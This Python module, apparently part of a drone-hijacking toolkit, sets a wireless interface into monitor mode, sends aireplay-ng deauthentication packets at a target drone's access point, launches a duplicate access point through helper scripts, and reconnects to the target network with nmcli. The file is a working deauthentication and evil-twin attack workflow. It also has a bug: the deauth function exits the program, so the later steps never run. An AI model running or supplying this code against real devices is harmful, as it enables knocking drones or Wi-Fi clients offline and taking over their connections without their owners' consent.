import os
import json
import subprocess
import sys
from src.utils import sudo_exec
import time
# from djitellopy import Tello

def deauth(interface, target_mac, target_channel, packets, target_ssid):
    try:
        # Put interface into monitor mode first
        sudo_exec(f"ifconfig {interface} down")
        sudo_exec(f"iwconfig {interface} mode monitor")
        sudo_exec(f"ifconfig {interface} up")

        # Targeting specific channel of target drone
        sudo_exec(f"iwconfig {interface} channel {target_channel}")

        # Deauth attack command

        # aireplay-ng
        # -0 : Deauth attack
        # packets : Number of deauth packets to send
        # -a : Target BSSID (MAC address)
        # target_mac : Target BSSID (MAC) from input file
        # interface : Network interface to use

        sudo_exec(f"aireplay-ng -0 {packets} -a {target_mac} {interface}")

        sys.exit(0)
        
    except Exception as e:
        print(f"ERROR: Reauth module failed: {e}")
        sys.exit(1)

def reauth(target_ssid, target_mac, interface):
    try:
        # Reauth attack cmd - connect to the target network via its SSID
        print(f"[*] Attempting to connect to network '{target_ssid}'...")
        
        # First, try to start NetworkManager if it's not running
        print("[*] Ensuring NetworkManager is running...")
        nm_status = subprocess.run("systemctl is-active --quiet NetworkManager", shell=True)
        if nm_status.returncode != 0:
            print("[*] Starting NetworkManager...")
            result = sudo_exec("systemctl start NetworkManager")
            if result.returncode != 0:
                print("WARNING: Could not start NetworkManager")
            time.sleep(2)
        
        # nmcli dev wifi connect <SSID> ifname <interface>
        # For open networks (no password required)
        result = sudo_exec(f"nmcli dev wifi connect '{target_ssid}' bssid {target_mac} ifname {interface}")
        
        if result.returncode != 0:
            print(f"ERROR: nmcli connection failed with return code {result.returncode}")
            print("Connection attempt failed. Possible causes:")
            print(f"1. Network '{target_ssid}' is not in range")
            print("2. Network requires a password (open network assumed)")
            print("3. NetworkManager is not available")
            print("4. Interface is not available")
            sys.exit(1)
        
        print("[+] Successfully connected to target network!")
        
        # Wait a moment for the connection to stabilize
        time.sleep(2)
        
        # Unsure
        sys.exit(0)
        
    except Exception as e:
        print(f"ERROR: Reauth module failed: {e}")
        sys.exit(1)


def __main__(interface, target_mac, target_channel, packets, target_ssid):
    try:
        # Setup the duplicate AP
        sudo_exec(f"./SetupAP.sh {interface}")

        # Deauth
        deauth(interface, target_mac, target_channel, packets, target_ssid)

        # Start the duplicate AP
        sudo_exec(f"./StartAP.sh {interface}")

        # Reauth
        reauth(target_ssid, target_mac, interface)

        # Exit, return to the relay module
        sys.exit(0)
        
    except Exception as e:
        print(f"ERROR: Reauth module failed: {e}")
        sys.exit(1)

